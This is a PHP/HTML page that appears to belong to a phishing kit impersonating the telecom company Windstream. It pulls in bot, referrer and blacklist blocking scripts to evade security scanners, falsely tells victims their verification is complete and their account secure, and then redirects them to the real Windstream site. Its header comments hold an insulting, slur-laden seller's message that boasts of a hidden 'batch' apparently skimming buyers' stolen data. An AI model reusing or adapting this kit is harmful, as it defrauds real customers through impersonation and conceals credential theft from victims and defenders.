<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="Refresh" content="3; url=https://www.windstream.com/">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <title>Windstream - Verification Complete</title>

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        .success-container {
            background: linear-gradient(145deg, #ffffff, #f8f9fa);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
            border-radius: 1.5rem;
        }

        .checkmark-gif {
            animation: bounce 2s infinite;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-10px);
            }
        }

        .brand-orange {
            color: #00002e;
        }
    </style>
</head>

<body class="bg-gray-50 min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-white shadow-sm">
        <nav class="container mx-auto px-6 py-4 flex justify-center items-center">
            <a href="#" aria-label="Windstream Home">
                <img src="./assets/img/windstream.jpg" alt="Windstream Logo" class="h-12">
            </a>
        </nav>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center py-12 px-4">
        <div class="success-container rounded-2xl p-8 max-w-md w-full text-center">
            <h1 class="text-3xl font-bold text-gray-900 mb-6">
                Verification Complete
            </h1>

            <div class="flex justify-center mb-6">
                <img src="./assets/img/372103860_CHECK_MARK_400px.gif" alt="Success Checkmark"
                    class="checkmark-gif w-48 h-48 object-contain">
            </div>

            <p class="text-gray-600 text-lg leading-relaxed">
                We thank you for completing the verification steps.<br>
                Your account is now secure.
            </p>

            <p class="text-sm text-gray-500 mt-6">
                Redirecting to Windstream.com in <span class="font-semibold text-orange-600">3</span> seconds...
            </p>
        </div>
    </main>



    <!-- Countdown Timer (Optional Enhancement) -->
    <script>
        let seconds = 3;
        const timerEl = document.querySelector('.text-orange-600');
        const interval = setInterval(() => {
            seconds--;
            if (timerEl) timerEl.textContent = seconds;
            if (seconds <= 0) clearInterval(interval);
        }, 1000);
    </script>


</body>

</html>